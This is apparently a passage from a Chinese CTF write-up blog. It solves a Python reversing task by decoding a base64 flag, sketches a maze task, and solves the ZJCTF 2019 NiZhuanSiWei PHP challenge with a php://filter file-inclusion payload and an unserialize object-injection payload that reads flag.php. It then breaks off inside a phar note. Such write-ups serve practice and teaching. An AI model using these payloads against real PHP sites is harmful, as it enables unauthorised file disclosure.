class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># uncompyle6 version 3.9.2</span></span><br><span class=\"line\"><span class=\"comment\"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class=\"line\"><span class=\"comment\"># Decompiled from: Python 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class=\"line\"><span class=\"comment\"># Embedded file name: 2.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> turtle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">flyTo</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    turtle.goto(x, y)</span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawEye</span>():</span><br><span class=\"line\">    turtle.tracer(<span class=\"literal\">False</span>)</span><br><span class=\"line\">    a = <span class=\"number\">2.5</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">120</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"number\">0</span> &lt;= i &lt; <span class=\"number\">30</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"number\">60</span> &lt;= i &lt; <span class=\"number\">90</span>:</span><br><span class=\"line\">                a -= <span class=\"number\">0.05</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            a += <span class=\"number\">0.05</span></span><br><span class=\"line\">        turtle.left(<span class=\"number\">3</span>)</span><br><span class=\"line\">        turtle.fd(a)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        turtle.tracer(<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">beard</span>():</span><br><span class=\"line\">    flyTo(-<span class=\"number\">37</span>, <span class=\"number\">135</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">165</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\">    flyTo(-<span class=\"number\">37</span>, <span class=\"number\">125</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\">    flyTo(-<span class=\"number\">37</span>, <span class=\"number\">115</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">193</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\">    flyTo(<span class=\"number\">37</span>, <span class=\"number\">135</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">15</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\">    flyTo(<span class=\"number\">37</span>, <span class=\"number\">125</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\">    flyTo(<span class=\"number\">37</span>, <span class=\"number\">115</span>)</span><br><span class=\"line\">    turtle.seth(-<span class=\"number\">13</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawRedScarf</span>():</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;red&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">200</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">5</span>, <span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">5</span>, <span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">207</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">5</span>, <span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">5</span>, <span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawMouse</span>():</span><br><span class=\"line\">    flyTo(<span class=\"number\">5</span>, <span class=\"number\">148</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">270</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">100</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">120</span>, <span class=\"number\">50</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">230</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">120</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawRedNose</span>():</span><br><span class=\"line\">    flyTo(-<span class=\"number\">10</span>, <span class=\"number\">158</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;red&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">20</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawBlackdrawEye</span>():</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    flyTo(-<span class=\"number\">20</span>, <span class=\"number\">195</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#000000&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">13</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">6</span>)</span><br><span class=\"line\">    flyTo(<span class=\"number\">20</span>, <span class=\"number\">205</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">75</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">10</span>, <span class=\"number\">150</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">3</span>)</span><br><span class=\"line\">    flyTo(-<span class=\"number\">17</span>, <span class=\"number\">200</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#ffffff&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">5</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(<span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawFace</span>():</span><br><span class=\"line\">    turtle.forward(<span class=\"number\">183</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;white&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.left(<span class=\"number\">45</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">120</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">90</span>)</span><br><span class=\"line\">    drawEye()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">60</span>)</span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">90</span>)</span><br><span class=\"line\">    drawEye()</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">64</span>)</span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">215</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">120</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawHead</span>():</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">150</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#00a0de&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">150</span>, <span class=\"number\">280</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drawAll</span>():</span><br><span class=\"line\">    drawHead()</span><br><span class=\"line\">    drawRedScarf()</span><br><span class=\"line\">    drawFace()</span><br><span class=\"line\">    drawRedNose()</span><br><span class=\"line\">    drawMouse()</span><br><span class=\"line\">    beard()</span><br><span class=\"line\">    flyTo(<span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">150</span>, <span class=\"number\">50</span>)</span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">30</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">40</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">30</span>, <span class=\"number\">270</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#00a0de&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">230</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">80</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">1000</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    turtle.seth(-<span class=\"number\">89</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">1000</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">30</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">100</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">1000</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    turtle.seth(-<span class=\"number\">86</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">1000</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">230</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">40</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">30</span>, <span class=\"number\">230</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">45</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">81</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">203</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">5</span>, <span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">5</span>, <span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">7</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">40</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">150</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">30</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">40</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#FFFFFF&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">30</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(<span class=\"number\">103.74</span>, -<span class=\"number\">182.59</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#FFFFFF&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">15</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">15</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">15</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(-<span class=\"number\">96.26</span>, -<span class=\"number\">182.59</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#FFFFFF&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">15</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">15</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">15</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(-<span class=\"number\">133.97</span>, -<span class=\"number\">91.81</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">50</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#FFFFFF&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">30</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(-<span class=\"number\">103.42</span>, <span class=\"number\">15.09</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">38</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">230</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">90</span>, <span class=\"number\">260</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(<span class=\"number\">5</span>, -<span class=\"number\">40</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.seth(-<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">70</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">0</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">70</span>)</span><br><span class=\"line\">    flyTo(-<span class=\"number\">103.42</span>, <span class=\"number\">15.09</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#ffd200&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">20</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">170</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&quot;#ffd200&quot;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">2</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">10</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">100</span>, <span class=\"number\">22</span>)</span><br><span class=\"line\">    turtle.circle(-<span class=\"number\">2</span>, <span class=\"number\">180</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">170</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">100</span>, <span class=\"number\">22</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    flyTo(-<span class=\"number\">13.42</span>, <span class=\"number\">15.09</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">250</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">20</span>, <span class=\"number\">110</span>)</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">90</span>)</span><br><span class=\"line\">    turtle.fd(<span class=\"number\">15</span>)</span><br><span class=\"line\">    turtle.dot(<span class=\"number\">10</span>)</span><br><span class=\"line\">    flyTo(<span class=\"number\">0</span>, -<span class=\"number\">150</span>)</span><br><span class=\"line\">    drawBlackdrawEye()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    turtle.screensize(<span class=\"number\">800</span>, <span class=\"number\">6000</span>, <span class=\"string\">&quot;#F0F0F0&quot;</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">3</span>)</span><br><span class=\"line\">    turtle.speed(<span class=\"number\">9</span>)</span><br><span class=\"line\">    drawAll()</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    turtle.goto(<span class=\"number\">100</span>, -<span class=\"number\">300</span>)</span><br><span class=\"line\">    turtle.write(<span class=\"string\">&quot;by peak&quot;</span>, font=(<span class=\"string\">&#x27;Bradley Hand ITC&#x27;</span>, <span class=\"number\">30</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\">turtle.mainloop()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;fVJXNjE0ODBpM2RrZmNSVzYxNDgwaTNka01BSlVPe25oc20=&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># okay decompiling 2.pyc</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>一眼怀疑<code>fVJXNjE0ODBpM2RrZmNSVzYxNDgwaTNka01BSlVPe25oc20=</code>是base64</p>\n<p>解密得到</p>\n<p>}RW61480i3dkfcRW61480i3dkMAJUO{nhsm</p>\n<p>到这里就差不多了，rot和逆向输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#125;RW61480i3dkfcRW61480i3dkMAJUO&#123;nhsm</span><br><span class=\"line\">&#125;KP61480b3wdyvKP61480b3wdFTCNH&#123;galf</span><br><span class=\"line\">flag&#123;HNCTFdw3b08416PKvydw3b08416PK&#125; 得到flag</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"RE4\"><a href=\"#RE4\" class=\"headerlink\" title=\"RE4\"></a>RE4</h3><p>使用 dnSpy 或其他调试工具，加载程序并设置断点，特别是在生成迷宫之后的位置。<br>在程序运行到生成迷宫后，暂停执行。<br>在内存中查找迷宫数据，通常需要在调试器的内存视图中进行查找。<br>找到迷宫数据后，将其提取出来。<br>如果迷宫数据经过 RC4 加密，需要找到相应的密钥和解密逻辑。<br>使用 RC4 解密算法将提取的迷宫数据解密。 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00******0000</span><br><span class=\"line\">*000000*0**0</span><br><span class=\"line\">******0*0**0</span><br><span class=\"line\">**100*000**0</span><br><span class=\"line\">****0******0</span><br><span class=\"line\">****00000000</span><br><span class=\"line\">r (右) d (下) u (上) l (左)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"NSS系列\"><a href=\"#NSS系列\" class=\"headerlink\" title=\"NSS系列\"></a>NSS系列</h1><h2 id=\"文件包含和序列化综合\"><a href=\"#文件包含和序列化综合\" class=\"headerlink\" title=\"文件包含和序列化综合\"></a>文件包含和序列化综合</h2><p>[ZJCTF 2019]NiZhuanSiWei</p>\n<p> <a href=\"https://www.nssctf.cn/problem/22\">https://www.nssctf.cn/problem/22</a> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$text</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;text&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;file&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$text</span>)&amp;&amp;(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$text</span>,<span class=\"string\">&#x27;r&#x27;</span>)===<span class=\"string\">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$text</span>,<span class=\"string\">&#x27;r&#x27;</span>).<span class=\"string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/&quot;</span>,<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Not now!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        <span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$password</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>\n<p>base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span>(<span class=\"params\"></span>)</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br></pre></td></tr></table></figure>\n\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>\n<h2 id=\"玄学诡异sql题\"><a href=\"#玄学诡异sql题\" class=\"headerlink\" title=\"玄学诡异sql题\"></a>玄学诡异sql题</h2><p> <a href=\"https://www.nssctf.cn/problem/1093\">https://www.nssctf.cn/problem/1093</a> </p>\n<p>详解 <a href=\"https://www.cnblogs.com/junlebao/p/13859371.html\">https://www.cnblogs.com/junlebao/p/13859371.html</a> </p>\n<h2 id=\"prize系列\"><a href=\"#prize系列\" class=\"headerlink\" title=\"prize系列\"></a>prize系列</h2><h3 id=\"prize-p1\"><a href=\"#prize-p1\" class=\"headerlink\" title=\"prize_p1\"></a>prize_p1</h3><p>一个phar文件经过压缩之后，再用phar协议读取打开，也是可以正常执行的</p>\n<ol>\n<li>普通phar</li>\n<li>gzip</li>\n<li>bzip2</li>\n<li>tar</li>\n<li>zip</li>\n</ol>\n<p>一共就5中可以触发phar操作</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getflag</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">getenv</span>(<span 